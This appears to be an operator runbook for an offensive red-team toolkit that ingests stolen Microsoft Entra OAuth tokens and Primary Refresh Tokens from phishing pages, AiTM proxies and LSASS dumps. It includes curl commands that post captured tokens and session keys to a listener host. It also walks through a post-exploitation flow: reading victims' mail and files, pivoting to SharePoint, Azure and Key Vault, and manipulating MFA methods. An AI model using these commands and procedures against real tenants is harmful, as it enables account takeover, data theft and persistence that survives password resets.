# Token & PRT intake — operator walkthrough

This is a task-oriented runbook for the two intake paths added on top of the
device-code capture flow:

- the **token listener** — a standalone server that ingests OAuth tokens pushed
  in from an AiTM proxy, a phishing page, or a manual drop; and
- **PRT intake** — storing a captured Primary Refresh Token and using it across
  the whole post-exploitation toolset.

Reference material lives in [configuration.md](configuration.md#token-listener)
and [api-reference.md](api-reference.md#token-listener); this page is the
step-by-step version.

---

## 0. Prerequisites

- A running console (`entraith server <config>`) and an operator session.
- A **campaign** — tokens and PRTs are ingested *into* a campaign. Create one
  from the dashboard, or set `listener.default_campaign` in the config.
- For anything that mints tokens from a PRT you need the **session key**
  (derived/clear key) captured alongside the PRT. Without it the PRT is stored
  but cannot be exchanged.

---

## 1. Token listener (access / refresh / id tokens)

The listener is a separate server on its own port (default `8000`), unauthenticated
by design so an external component can POST to it. Bind it where only your
infrastructure can reach it, or front it with a redirector.

**Activate it** — Broker tab → *Token Listener* panel → set port → **Start**
(or `listener.token_autostart = true`, or `POST /api/token-listener/start`).

**Feed it** — an AiTM proxy / phishing page / curl POSTs the captured token:

```bash
curl -X POST http://LISTENER_HOST:8000/token \
  -H 'Content-Type: application/json' \
  -d '{"access_token":"eyJ...","refresh_token":"0.AX...",
       "campaign_id":"camp-123","source":"aitm"}'
```

The token is ingested exactly like a device-code capture: it shows up under the
campaign **Tokens** tab and is usable by every post-ex tool. The target is
matched by `target_id`/`target_email`, or auto-created from the JWT claims.
The listener's audit log (`token_listener.log`) records only redacted token
fingerprints.

---

## 2. PRT intake

A PRT is **stronger than a single token** — it can mint tokens for *any*
resource and survives password resets. Entraith treats it accordingly: the PRT
is stored **complete** in the PRT vault (encrypted at rest) and **stays there at
full strength**; using it in a campaign never consumes or weakens it.

### 2a. Drop a PRT from the console

Tools → 🔑 **Primary Refresh Tokens** → **PRT Intake** tab:

1. Paste the **PRT** and its **session key**, plus UPN and tenant.
2. (Optional) tick **Use in campaign** and pick a campaign.
3. **▶ Ingest PRT**.

Without "Use in campaign" the PRT is just stored in the vault. With it (and a
session key), entraith also mints a Graph access token **and a family refresh
token** and ingests them as a campaign target.

### 2b. Drop a PRT over the wire

Same effect as the console drop — the standalone listener need not be running for
the console path, but over the wire it goes to the listener:

```bash
curl -X POST http://LISTENER_HOST:8000/token \
  -H 'Content-Type: application/json' \
  -d '{"prt":"0.AX...","session_key":"<derived/clear key>",
       "upn":"ceo@contoso.com","tenant_id":"<tid>",
       "campaign_id":"camp-123","source":"cloudap-lsass"}'
```

### 2c. Use an already-stored PRT

Tools → 🔑 **Primary Refresh Tokens** → **Stored PRTs** → on the PRT's card, pick
a campaign → **⚡ Use in campaign**. On success, **→ Graph Ops** jumps straight
into Graph Actions with the identity selected. Cards for PRTs stored without a
session key show a hint instead of the button.

---

## 3. Why this covers "the whole toolset"

Using a PRT in a campaign mints two things and ingests them onto the target:

- a **Graph access token** → **Graph Actions**;
- a **family refresh token** (via the Office FOCI client) → everything that
  works off the target's refresh token: **Token Exchange** (cross-resource —
  SharePoint, Azure, Key Vault, …) and **MFA** manipulation.

Meanwhile the PRT itself remains in the vault for the things only a PRT can do
directly: mint a token for an arbitrary resource (**Use PRT** tab), produce an
SSO cookie, or drive device / WinHello registration with a DRS-scoped token.

So the PRT feeds the app two complementary ways — activated on a target (the
automatic toolset) and straight from the vault (raw PRT power) — and neither
spends the other. If an exchange returns no refresh token, the UI says
*Graph Actions only* so you know the cross-resource tools are not yet unlocked.

---

## 4. Demo flow (capture → vault → campaign → pivot)

1. **Capture** a PRT + session key on a compromised host (LSASS / CloudAP).
2. **Store** it — PRT Intake tab, or POST to the listener.
3. **Use in campaign** — Stored PRTs → *Use in campaign* → *Graph Ops*.
4. **Graph Actions** — read mail / files / Teams, enumerate users and groups.
5. **Pivot cross-resource** — Token Exchange from the same target to SharePoint /
   Azure / Key Vault (uses the family refresh token).
6. **MFA** — inspect or manipulate the target's authentication methods.
7. **Raw PRT** — back in the vault, mint an SSO cookie or a DRS token directly
   from the PRT to show it is still at full strength.
8. **Teardown** — roll back any pushed artifacts from the deployment ledger.
